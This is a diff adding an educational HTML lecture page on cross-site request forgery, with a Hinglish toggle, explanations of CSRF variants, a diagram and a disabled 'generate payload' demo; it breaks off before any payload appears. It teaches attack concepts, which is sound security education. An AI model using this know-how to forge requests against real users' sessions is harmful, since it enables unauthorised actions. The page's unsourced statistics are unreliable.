@@ -1,0 +1,2198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="description" content="Interactive CSRF Vulnerability Masterclass with Live Hinglish Translation | Quiz | Try It Yourself | By HTB Elite Hacker">
+  <title>CSRF Vulnerabilities | By Ankush Rana</title>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;600;700;900&family=Roboto:wght@300;400;500;700&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <style>
+    :root {
+      --primary: #0a1121;
+      --dark-navy: #0b1b30;
+      --neon-green: #00ff88;
+      --electric-blue: #00aaff;
+      --neon-orange: #ff8800;
+      --neon-pink: #ff0080;
+      --glow-green: rgba(0, 255, 136, 0.3);
+      --glow-blue: rgba(0, 170, 255, 0.2);
+      --glow-pink: rgba(255, 0, 128, 0.3);
+      --light-gray: #e0e0e0;
+      --mid-gray: #aaaaaa;
+      --card-bg: #111c30;
+      --border: #2a4060;
+      --keyword: #ffdd57;
+      --keyword-bg: rgba(255, 221, 87, 0.15);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: var(--primary);
+      color: var(--light-gray);
+      line-height: 1.7;
+      overflow-x: hidden;
+    }
+
+    /* Three.js Background */
+    #three-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    /* Translator Button */
+    .translator-btn {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 1000;
+      background: var(--neon-green);
+      color: var(--primary);
+      border: none;
+      border-radius: 6px;
+      padding: 10px 16px;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 0.9rem;
+      cursor: pointer;
+      box-shadow: 0 0 15px var(--glow-green);
+      transition: all 0.3s ease;
+    }
+
+    .translator-btn:hover {
+      transform: translateY(-2px);
+      background: #00cc6d;
+    }
+
+    /* Header / Hero */
+    header {
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero-content {
+      z-index: 2;
+      max-width: 900px;
+      position: relative;
+    }
+
+    .hero-content h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: clamp(2.8rem, 8vw, 4rem);
+      color: white;
+      margin-bottom: 10px;
+      text-shadow: 0 0 15px rgba(0, 255, 136, 0.6);
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
+      50% { text-shadow: 0 0 25px rgba(0, 255, 136, 0.9), 0 0 35px rgba(0, 255, 136, 0.5); }
+      100% { text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
+    }
+
+    .hero-content h1 span {
+      color: var(--neon-green);
+    }
+
+    .subtitle {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: clamp(1.2rem, 3.5vw, 1.5rem);
+      color: var(--electric-blue);
+      margin: 15px 0;
+    }
+
+    /* Section Styling */
+    section {
+      padding: 100px 0;
+      position: relative;
+    }
+
+    .section-title {
+      font-family: 'Orbitron', sans-serif;
+      font-size: clamp(2rem, 5vw, 2.5rem);
+      color: var(--neon-green);
+      margin-bottom: 50px;
+      position: relative;
+      display: inline-block;
+    }
+
+    .section-title::after {
+      content: '';
+      position: absolute;
+      left: 0;
+      bottom: -8px;
+      width: 70px;
+      height: 4px;
+      background: var(--electric-blue);
+      animation: expand 2s infinite;
+    }
+
+    @keyframes expand {
+      0% { width: 70px; }
+      50% { width: 100px; }
+      100% { width: 70px; }
+    }
+
+    /* Lecture Card */
+    .lecture-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 30px;
+      margin: 30px 0;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      transition: all 0.4s ease;
+      position: relative;
+      overflow: hidden;
+      cursor: pointer;
+    }
+
+    .lecture-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(45deg, transparent, rgba(0, 255, 136, 0.05), transparent);
+      z-index: 0;
+    }
+
+    .lecture-card.pop-out {
+      transform: translateY(-20px) scale(1.05);
+      box-shadow:
+        0 30px 60px rgba(0, 0, 0, 0.5),
+        0 0 50px var(--glow-green);
+      border-color: var(--neon-green);
+      z-index: 5;
+    }
+
+    .lecture-card.focused {
+      transform: translateY(-20px) scale(1.06);
+      box-shadow:
+        0 40px 80px rgba(0, 0, 0, 0.6),
+        0 0 70px var(--glow-green);
+      filter: brightness(1.1);
+    }
+
+    .lecture-card h3 {
+      color: var(--neon-green);
+      font-family: 'Orbitron', sans-serif;
+      margin-bottom: 18px;
+      font-size: 1.8rem;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* Keyword Style */
+    .keyword {
+      background: var(--keyword-bg);
+      color: var(--keyword);
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-weight: 500;
+      cursor: pointer;
+      border-bottom: 1px dashed var(--keyword);
+      position: relative;
+      transition: all 0.3s ease;
+      z-index: 2;
+    }
+
+    .keyword:hover {
+      background: rgba(255, 221, 87, 0.3);
+      box-shadow: 0 0 12px rgba(255, 221, 87, 0.4);
+    }
+
+    /* Tooltip (Modal) */
+    .keyword-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(10, 17, 33, 0.95);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+    }
+
+    .keyword-modal.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .modal-content {
+      background: var(--card-bg);
+      border: 2px solid var(--neon-green);
+      border-radius: 14px;
+      padding: 30px;
+      max-width: 500px;
+      width: 90%;
+      box-shadow: 0 0 50px var(--glow-green);
+      position: relative;
+      transform: scale(0.9);
+      transition: transform 0.3s ease;
+    }
+
+    .keyword-modal.active .modal-content {
+      transform: scale(1);
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: none;
+      border: none;
+      color: var(--neon-green);
+      font-size: 1.5rem;
+      cursor: pointer;
+    }
+
+    .modal-title {
+      color: var(--neon-green);
+      font-family: 'Orbitron', sans-serif;
+      margin-bottom: 15px;
+      font-size: 1.5rem;
+    }
+
+    .modal-body {
+      color: var(--light-gray);
+      line-height: 1.6;
+    }
+
+    /* Interactive Demo */
+    .interactive-demo {
+      background: rgba(0, 20, 40, 0.6);
+      border-radius: 10px;
+      padding: 25px;
+      margin: 30px 0;
+      border: 1px solid var(--electric-blue);
+    }
+
+    .demo-container {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    .input-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .input-group label {
+      min-width: 120px;
+      font-family: 'JetBrains Mono', monospace;
+      color: var(--neon-green);
+    }
+
+    .input-group input, .input-group select {
+      flex: 1;
+      padding: 10px;
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      color: white;
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    .input-group input:focus, .input-group select:focus {
+      outline: none;
+      border-color: var(--neon-green);
+      box-shadow: 0 0 10px var(--glow-green);
+    }
+
+    .button {
+      padding: 12px 24px;
+      background: var(--neon-green);
+      color: var(--primary);
+      border: none;
+      border-radius: 4px;
+      font-family: 'Orbitron', sans-serif;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      width: fit-content;
+    }
+
+    .button:hover {
+      background: #00cc6d;
+      box-shadow: 0 0 15px var(--glow-green);
+      transform: translateY(-2px);
+    }
+
+    .result-box {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 6px;
+      padding: 15px;
+      margin-top: 15px;
+      border-left: 3px solid var(--neon-green);
+      font-family: 'JetBrains Mono', monospace;
+      min-height: 100px;
+      overflow-x: auto;
+      white-space: pre-wrap;
+    }
+
+    /* Diagram */
+    .diagram {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+      margin: 25px 0;
+      flex-wrap: wrap;
+    }
+
+    .box {
+      min-width: 140px;
+      padding: 18px;
+      border-radius: 12px;
+      text-align: center;
+      font-weight: bold;
+      font-size: 0.95rem;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .box::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+      transform: translateX(-100%);
+    }
+
+    .box:hover::before {
+      animation: shimmer 1.5s infinite;
+    }
+
+    @keyframes shimmer {
+      100% { transform: translateX(100%); }
+    }
+
+    .user-input { background: #8b0000; color: white; }
+    .app { background: #003366; color: white; }
+    .db { background: #004d00; color: #00ff88; }
+
+    .arrow {
+      font-size: 1.8rem;
+      color: var(--neon-green);
+      position: relative;
+    }
+
+    .arrow::before {
+      content: '→';
+      animation: arrow-pulse 1.5s infinite;
+    }
+
+    @keyframes arrow-pulse {
+      0% { text-shadow: 0 0 5px var(--neon-green); }
+      50% { text-shadow: 0 0 15px var(--neon-green); }
+      100% { text-shadow: 0 0 5px var(--neon-green); }
+    }
+
+    /* Code Block */
+    .code-block {
+      background: #001a1a;
+      color: #00ff88;
+      font-family: 'JetBrains Mono', monospace;
+      padding: 15px;
+      border-radius: 10px;
+      overflow-x: auto;
+      margin: 15px 0;
+      border-left: 4px solid var(--neon-green);
+      position: relative;
+    }
+
+    .code-block::before {
+      content: 'CODE';
+      position: absolute;
+      top: 0;
+      right: 0;
+      background: var(--neon-green);
+      color: var(--primary);
+      font-size: 0.7rem;
+      padding: 2px 8px;
+      border-bottom-left-radius: 4px;
+      font-weight: bold;
+    }
+
+    /* Statistics Section */
+    .stats-container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      justify-content: center;
+      margin: 30px 0;
+    }
+
+    .stat-box {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+      min-width: 200px;
+      text-align: center;
+      transition: all 0.3s ease;
+    }
+
+    .stat-box:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+      border-color: var(--neon-green);
+    }
+
+    .stat-number {
+      font-size: 2.5rem;
+      font-weight: bold;
+      color: var(--neon-green);
+      margin-bottom: 10px;
+    }
+
+    .stat-label {
+      color: var(--mid-gray);
+      font-size: 0.9rem;
+    }
+
+    /* Quiz Section */
+    .quiz-container {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 25px;
+      margin: 30px 0;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    .quiz-question {
+      margin-bottom: 20px;
+    }
+
+    .quiz-question h4 {
+      color: var(--neon-green);
+      margin-bottom: 10px;
+    }
+
+    .options {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .option {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .option:hover {
+      background: rgba(0, 255, 136, 0.1);
+      box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
+    }
+
+    .option.selected {
+      background: var(--neon-green);
+      color: var(--primary);
+      font-weight: bold;
+    }
+
+    .score-display {
+      text-align: center;
+      font-size: 1.5rem;
+      margin: 20px 0;
+      color: var(--neon-green);
+      font-family: 'Orbitron', sans-serif;
+    }
+
+    .button.quiz-submit {
+      background: var(--neon-orange);
+      color: white;
+    }
+
+    .button.quiz-submit:hover {
+      background: #cc7000;
+    }
+
+    /* Progress Bar */
+    .progress-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 4px;
+      background: transparent;
+      z-index: 1000;
+    }
+
+    .progress-bar {
+      height: 100%;
+      background: var(--neon-green);
+      width: 0%;
+      transition: width 0.3s ease;
+    }
+
+    /* Notification */
+    .notification {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: var(--card-bg);
+      border: 1px solid var(--neon-green);
+      border-radius: 8px;
+      padding: 15px;
+      color: var(--light-gray);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      transform: translateY(100px);
+      opacity: 0;
+      transition: all 0.3s ease;
+      z-index: 1000;
+    }
+
+    .notification.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    /* Footer */
+    footer {
+      text-align: center;
+      padding: 60px 0;
+      background: var(--dark-navy);
+      color: var(--mid-gray);
+      position: relative;
+      overflow: hidden;
+    }
+
+    footer::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 3px;
+      background: linear-gradient(90deg, var(--neon-green), var(--electric-blue), var(--neon-pink));
+    }
+
+    .social-links {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 20px;
+    }
+
+    .social-link {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      background: var(--card-bg);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 1.2rem;
+      transition: all 0.3s ease;
+    }
+
+    .social-link:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .social-link.github:hover { background: var(--neon-green); color: var(--primary); }
+    .social-link.email:hover { background: var(--electric-blue); }
+    .social-link.htb:hover { background: var(--neon-orange); }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .hero-content h1 { font-size: 2.8rem; }
+      .section-title { font-size: 1.8rem; }
+      .diagram { flex-direction: column; }
+      .arrow::before { content: '↓'; }
+      .input-group { flex-direction: column; }
+      .input-group label { min-width: auto; }
+    }
+
+    /* CSRF Specific Styles */
+    .csrf-demo {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      margin: 20px 0;
+    }
+
+    .request-response {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin: 15px 0;
+    }
+
+    .request, .response {
+      padding: 15px;
+      border-radius: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.9rem;
+    }
+
+    .request {
+      background: rgba(0, 50, 100, 0.5);
+      border-left: 4px solid var(--electric-blue);
+    }
+
+    .response {
+      background: rgba(0, 80, 0, 0.5);
+      border-left: 4px solid var(--neon-green);
+    }
+
+    .header-row {
+      display: flex;
+      margin: 5px 0;
+    }
+
+    .header-name {
+      min-width: 150px;
+      color: var(--mid-gray);
+    }
+
+    .header-value {
+      flex: 1;
+      color: white;
+    }
+
+    /* Security Enhancement Styles */
+    .security-warning {
+      background: rgba(255, 136, 0, 0.1);
+      border: 1px solid var(--neon-orange);
+      border-radius: 8px;
+      padding: 15px;
+      margin: 15px 0;
+      color: var(--neon-orange);
+      font-size: 0.9rem;
+      text-align: center;
+    }
+
+    .security-warning::before {
+      content: "⚠️ SECURITY WARNING: ";
+      font-weight: bold;
+    }
+
+    .demo-disabled {
+      opacity: 0.6;
+      pointer-events: none;
+      position: relative;
+    }
+
+    .demo-disabled::after {
+      content: "DEMO DISABLED - Educational Purposes Only";
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(255, 0, 0, 0.9);
+      color: white;
+      padding: 10px 20px;
+      border-radius: 4px;
+      font-size: 1rem;
+      font-weight: bold;
+      z-index: 1000;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Progress Bar -->
+  <div class="progress-container">
+    <div class="progress-bar" id="progress-bar"></div>
+  </div>
+
+  <!-- Translator Button -->
+  <button class="translator-btn" id="translator-btn" onclick="toggleLanguage()" style="right: auto; left: 20px;">
+    🌐 Hinglish On
+  </button>
+
+  <!-- Keyword Modal -->
+  <div class="keyword-modal" id="keyword-modal">
+    <div class="modal-content">
+      <button class="modal-close" id="modal-close">&times;</button>
+      <h3 class="modal-title" id="modal-title">Keyword</h3>
+      <div class="modal-body" id="modal-body">Definition will appear here.</div>
+    </div>
+  </div>
+
+  <!-- Notification -->
+  <div class="notification" id="notification">
+    <i class="fas fa-info-circle"></i> <span id="notification-text">Welcome to the CSRF Vulnerability Masterclass!</span>
+  </div>
+
+  <!-- Three.js Background Canvas -->
+  <canvas id="three-canvas"></canvas>
+
+  <!-- Header / Hero -->
+  <header id="home">
+    <div class="container">
+      <div class="hero-content">
+        <!-- English Version -->
+        <div class="en">
+          <h1>CSRF <span>Vulnerabilities</span></h1>
+          <div class="subtitle">By Ankush Rana | HTB Elite Hacker | Senior Security Engineer</div>
+          <p>A deep dive into Cross-Site Request Forgery vulnerabilities, exploitation techniques, and real-world attacks — with interactive demos and elite-level insights.</p>
+        </div>
+
+        <!-- Hinglish Version -->
+        <div class="hi" style="display:none;">
+          <h1>CSRF <span>Vulnerabilities</span></h1>
+          <div class="subtitle">Ankush Rana द्वारा | HTB Elite Hacker | Senior Security Engineer</div>
+          <p>Cross-Site Request Forgery vulnerabilities, exploitation techniques, aur real-world attacks mein gahrai se jaane — interactive demos aur elite-level samajh ke saath.</p>
+        </div>
+
+        <!-- HTB & Bug Bounty Credibility -->
+        <div style="margin-top: 40px; display: flex; align-items: center; gap: 25px; flex-wrap: wrap; justify-content: center; font-family: 'JetBrains Mono', monospace;">
+          <img src="https://www.hackthebox.com/storage/achievements/elite_2024_badge.svg" alt="HTB Elite" style="width: 90px; filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5));">
+          <div style="text-align: center;">
+            <img src="https://via.placeholder.com/100/0a1121/00ff88?text=AR" alt="Ankush Rana" style="width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--neon-green); filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5));">
+            <p style="margin: 5px 0 0; color: var(--neon-green);">52+ User Flags</p>
+            <p style="margin: 0; color: var(--electric-blue);">47+ Root Owned</p>
+          </div>
+          <div style="text-align: center;">
+            <p style="color: var(--neon-orange);">🏆 Top 10 India</p>
+            <p style="color: var(--neon-pink);">💼 Sattrix | GPSSI</p>
+          </div>
+        </div>
+
+        <!-- Call to Action -->
+        <div style="margin-top: 30px; font-family: 'Orbitron', sans-serif; color: var(--electric-blue);">
+          <i class="fas fa-mouse-pointer"></i> Toggle Hinglish Mode → <strong>Top Left Corner</strong>
+          <div style="display: flex; justify-content: center; margin-top: 10px;"><button class="translator-btn" id="translator-btn" onclick="toggleLanguage()" style="position: relative; margin: 0 auto;">🌐 Hinglish On</button></div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Section: What is CSRF? -->
+  <section id="basics">
+    <div class="container">
+      <h2 class="section-title en">What is CSRF?</h2>
+      <h2 class="section-title hi" style="display:none;">CSRF Kya Hai?</h2>
+
+      <!-- Progress Tracker -->
+      <div class="progress-tracker" style="display: flex; justify-content: space-between; margin: 20px 0; font-family: 'Orbitron', sans-serif;">
+        <div class="progress-step active" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 255, 136, 0.1); border: 1px solid var(--neon-green); border-radius: 8px; margin: 0 5px;">
+          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-green);">1</div>
+          <div class="step-title en">Basic Concepts</div>
+          <div class="step-title hi" style="display:none;">Mool Baat</div>
+        </div>
+        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 170, 255, 0.1); border: 1px solid var(--electric-blue); border-radius: 8px; margin: 0 5px;">
+          <div class="step-number" style="font-size: 1.5rem; color: var(--electric-blue);">2</div>
+          <div class="step-title en">Attack Vectors</div>
+          <div class="step-title hi" style="display:none;">Hamlawar Ke Tarika</div>
+        </div>
+        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 136, 0, 0.1); border: 1px solid var(--neon-orange); border-radius: 8px; margin: 0 5px;">
+          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-orange);">3</div>
+          <div class="step-title en">Advanced Techniques</div>
+          <div class="step-title hi" style="display:none;">Uchatam Tarika</div>
+        </div>
+        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 0, 128, 0.1); border: 1px solid var(--neon-pink); border-radius: 8px; margin: 0 5px;">
+          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-pink);">4</div>
+          <div class="step-title en">Prevention</div>
+          <div class="step-title hi" style="display:none;">Bachav</div>
+        </div>
+      </div>
+
+      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
+        <h3 class="en">Understanding CSRF</h3>
+        <h3 class="hi" style="display:none;">CSRF Ki Samajh</h3>
+        <p class="en">Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.</p>
+        <p class="hi" style="display:none;">Cross-Site Request Forgery (CSRF) ek hamlahara hai jo end user ko ek web application par kratut karne ke liye majbur karta hai jismein woh currently authenticated hai.</p>
+        <p class="en"><strong>Real Analogy:</strong> Like a signature forger making a victim sign documents - the forger (attacker) makes the victim (user) "sign" forms they don't want to.</p>
+        <p class="hi" style="display:none;"><strong>Asli Example:</strong> Jaise ek signature forger victim ko documents par sign karvata hai - forger (hamlawar) victim (user) ko un forms par "sign" karvata hai jo woh nahi chahta.</p>
+        <p class="en">CSRF misconfigurations are dangerous because they allow attackers to perform actions on behalf of authenticated users without their knowledge.</p>
+        <p class="hi" style="display:none;">CSRF misconfigurations khatarnaak hain kyunki yeh hamlawaron ko authenticated users ki tarah actions perform karne ki anumati dete hain bina unki jaankari ke.</p>
+        <p class="en"><span class="keyword" data-title="CSRF" data-content="Cross-Site Request Forgery: An attack that tricks users into executing actions they don't intend to perform.">CSRF</span> attacks exploit the trust that a web application has in the user's browser.</p>
+        <p class="hi" style="display:none;"><span class="keyword" data-title="CSRF" data-content="Cross-Site Request Forgery: Ek hamlahara jo users ko woh actions perform karwane mein fool karta hai jo woh nahi chahte.">CSRF</span> attacks web application ka user ke browser mein trust exploit karte hain.</p>
+      </div>
+
+      <!-- CSRF Visualization -->
+      <div class="lecture-card animate-on-scroll">
+        <h3 class="en">How CSRF Works - Visualization</h3>
+        <h3 class="hi" style="display:none;">CSRF Kaise Kaam Karta Hai - Chitra</h3>
+        <div class="diagram" style="margin: 30px 0;">
+          <div class="box user-input" style="min-width: 180px;">
+            <div class="en">Malicious Website</div>
+            <div class="hi" style="display:none;">Dushit Website</div>
+            <div style="font-size: 0.8rem; margin-top: 10px;">Contains CSRF exploit</div>
+          </div>
+          <div class="arrow"></div>
+          <div class="box app" style="min-width: 180px;">
+            <div class="en">Victim's Browser</div>
+            <div class="hi" style="display:none;">Victim Ka Browser</div>
+            <div style="font-size: 0.8rem; margin-top: 10px;">Sends forged request</div>
+          </div>
+          <div class="arrow"></div>
+          <div class="box db" style="min-width: 180px;">
+            <div class="en">Target Application</div>
+            <div class="hi" style="display:none;">Target Application</div>
+            <div style="font-size: 0.8rem; margin-top: 10px;">Executes unwanted action</div>
+          </div>
+        </div>
+        <p class="en">The attacker creates a malicious request that appears to come from the victim, tricking the target application into performing actions with the victim's privileges.</p>
+        <p class="hi" style="display:none;">Hamlawar ek dushit request banata hai jo victim se aayi hui lagti hai, target application ko victim ke privileges ke saath actions perform karne mein fool karta hai.</p>
+      </div>
+
+      <!-- Types of CSRF Vulnerabilities -->
+      <div class="lecture-card animate-on-scroll">
+        <h3 class="en">Types of CSRF Vulnerabilities</h3>
+        <h3 class="hi" style="display:none;">CSRF Vulnerabilities Ke Prakar</h3>
+        <ul style="margin: 15px 0 15px 30px;">
+          <li class="en"><span class="keyword" data-title="State-Changing Operations" data-content="CSRF attacks that perform state-changing operations like form submissions or API calls.">State-Changing Operations</span>: Actions that modify server state (POST, PUT, DELETE)</li>
+          <li class="hi" style="display:none;"><span class="keyword" data-title="State-Changing Operations" data-content="CSRF attacks jo state-changing operations perform karte hain jaise form submissions ya API calls.">State-Changing Operations</span>: Actions jo server state ko modify karte hain (POST, PUT, DELETE)</li>
+          <li class="en"><span class="keyword" data-title="JSON CSRF" data-content="Exploiting CSRF in JSON-based APIs and applications.">JSON CSRF</span>: Targeting APIs that accept JSON requests</li>
+          <li class="hi" style="display:none;"><span class="keyword" data-title="JSON CSRF" data-content="JSON-based APIs aur applications mein CSRF ka faida uthana.">JSON CSRF</span>: APIs jo JSON requests accept karte hain</li>
+          <li class="en"><span class="keyword" data-title="Login-Based CSRF" data-content="Tricking users into logging into malicious accounts automatically.">Login-Based CSRF</span>: Auto-login to attacker-controlled accounts</li>
+          <li class="hi" style="display:none;"><span class="keyword" data-title="Login-Based CSRF" data-content="Users ko malicious accounts mein automatically login karne ya fool karna.">Login-Based CSRF</span>: Attacker-controlled accounts mein auto-login</li>
+          <li class="en"><span class="keyword" data-title="GET-Based CSRF" data-content="Exploiting GET requests that perform state changes.">GET-Based CSRF</span>: Using GET requests for state-changing operations</li>
+          <li class="hi" style="display:none;"><span class="keyword" data-title="GET-Based CSRF" data-content="GET requests ka upyog jo state changes perform karte hain.">GET-Based CSRF</span>: State-changing operations ke liye GET requests ka upyog</li>
+        </ul>
+      </div>
+
+      <!-- Statistics -->
+      <div class="stats-container animate-on-scroll">
+        <div class="stat-box">
+          <div class="stat-number en">High</div>
+          <div class="stat-number hi" style="display:none;">High</div>
+          <div class="stat-label en">severity rating</div>
+          <div class="stat-label hi" style="display:none;">khatre ka level</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-number">40%</div>
+          <div class="stat-label en">of web apps vulnerable</div>
+          <div class="stat-label hi" style="display:none;">web apps kamjor hain</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-number">$10K+</div>
+          <div class="stat-label en">in bug bounty rewards</div>
+          <div class="stat-label hi" style="display:none;">bug bounty mein kamai</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section: Try It Yourself – CSRF -->
+  <section id="try-csrf">
+    <div class="container">
+      <h2 class="section-title en">Try It Yourself: CSRF Exploitation</h2>
+      <h2 class="section-title hi" style="display:none;">Khud Try Karein: CSRF Doharpan</h2>
+
+      <!-- Learning Path Progress -->
+      <div class="lecture-card animate-on-scroll">
+        <h3 class="en">Learning Path: Basic to Advanced</h3>
+        <h3 class="hi" style="display:none;">Sikshna Marg: Mool Se Uchatam</h3>
+<div class="progress-tracker" style="display: flex; justify-content: space-between; margin: 20px 0; font-family: 'Orbitron', sans-serif;">
+          <div class="progress-step active" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 255, 136, 0.1); border: 1px solid var(--neon-green); border-radius: 8px; margin: 0 5px;">
+            <div class="step-number" style="font-size: 1.2rem; color: var(--neon-green);">1</div>
+            <div class="step-title en">Basic CSRF Attack</div>
+            <div class="step-title hi" style="display:none;">Mool CSRF Attack</div>
+          </div>
+          <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 170, 255, 0.1); border: 1px solid var(--electric-blue); border-radius: 8px; margin: 0 5px;">
+            <div class="step-number" style="font-size: 1.2rem; color: var(--electric-blue);">2</div>
+            <div class="step-title en">Advanced Techniques</div>
+            <div class="step-title hi" style="display:none;">Uchatam Tarika</div>
+          </div>
+          <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 136, 0, 0.1); border: 1px solid var(--neon-orange); border-radius: 8px; margin: 0 5px;">
+            <div class="step-number" style="font-size: 1.2rem; color: var(--neon-orange);">3</div>
+            <div class="step-title en">Real-World Scenarios</div>
+            <div class="step-title hi" style="display:none;">Vastavik Duniya Ke Udaharan</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Security Notice -->
+      <div class="security-warning">
+        🔒 This is an educational lecture. Interactive demos are designed to teach CSRF concepts safely - no external requests are made. All examples are for learning purposes only.
+      </div>
+
+      <!-- Basic CSRF Demo -->
+      <div class="interactive-demo animate-on-scroll">
+        <h3 style="color: var(--neon-green); margin-bottom: 15px;" class="en">Level 1: Basic CSRF Attack (DEMO DISABLED)</h3>
+        <h3 style="color: var(--neon-green); margin-bottom: 15px; display:none;" class="hi">Level 1: Mool CSRF Attack (DEMO DISABLED)</h3>
+        <p class="en">Exploit a CSRF vulnerability to perform state-changing operations on behalf of an authenticated user.</p>
+        <p class="hi" style="display:none;">Ek authenticated user ki tarah state-changing operations perform karne ke liye CSRF vulnerability ka faida uthayein.</p>
+
+        <div class="csrf-demo">
+          <div class="input-group">
+            <label for="target-form" class="en">Target Form Action:</label>
+            <label for="target-form" class="hi" style="display:none;">Target Form Action:</label>
+            <input type="text" id="target-form" value="/api/user/action" placeholder="Educational endpoint (no external calls)">
+          </div>
+
+          <div class="input-group">
+            <label for="csrf-method" class="en">HTTP Method:</label>
+            <label for="csrf-method" class="hi" style="display:none;">HTTP Method:</label>
+            <select id="csrf-method">
+              <option value="POST">POST</option>
+              <option value="PUT">PUT</option>
+              <option value="DELETE">DELETE</option>
+              <option value="GET">GET</option>
+            </select>
+          </div>
+
+          <button class="button" onclick="generateCsrfPayload()">Generate CSRF Payload</button>
+
+          <div class="request-response">
+            <div class="request">
+              <strong>CSRF Payload:</strong>
